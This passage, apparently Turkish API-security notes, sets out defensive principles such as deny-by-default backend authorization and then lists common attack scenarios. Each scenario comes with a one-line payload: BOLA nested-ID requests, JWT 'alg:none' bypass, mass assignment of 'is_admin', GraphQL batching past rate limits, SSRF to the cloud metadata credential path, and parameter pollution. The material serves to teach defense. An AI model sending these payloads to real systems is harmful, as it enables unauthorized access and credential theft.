> Her katman — gateway, authentication, authorization, business logic, üçüncü taraf entegrasyon — **kendi başına** güvenli olmak zorundadır.

* Object + Property + Function seviyesinde yetkilendirme → her zaman backend'de, deny-by-default
* Kaynak tüketimi ve iş akışı kötüye kullanımı → teknik kontrol kadar davranışsal/iş mantığı kontrolü de gerektirir
* SSRF ve üçüncü taraf entegrasyonlar → "dış kaynak" güvenilir değildir, kullanıcı girdisi gibi ele alınmalıdır
* Envanter ve konfigürasyon → görünmeyen/unutulan API, test edilmeyen API demektir

---

## Yaygın Senaryolar

* BOLA — nested kaynak manipülasyonu
  `GET /api/v1/companies/12/departments/9931/employees/77482`

* JWT `alg:none` ile imza atlatma
  `{"alg":"none"} → user_id manipülasyonu`

* Mass Assignment ile yetki yükseltme
  `PUT /api/v1/profile { "is_admin": true }`

* GraphQL batching ile rate-limit atlatma
  `query { a1: login(...) a2: login(...) ... }`

* SSRF ile bulut metadata sızıntısı
  `callback_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`

* HPP ile WAF/backend uyuşmazlığı istismarı
  `?amount=10&amount=100000`

---
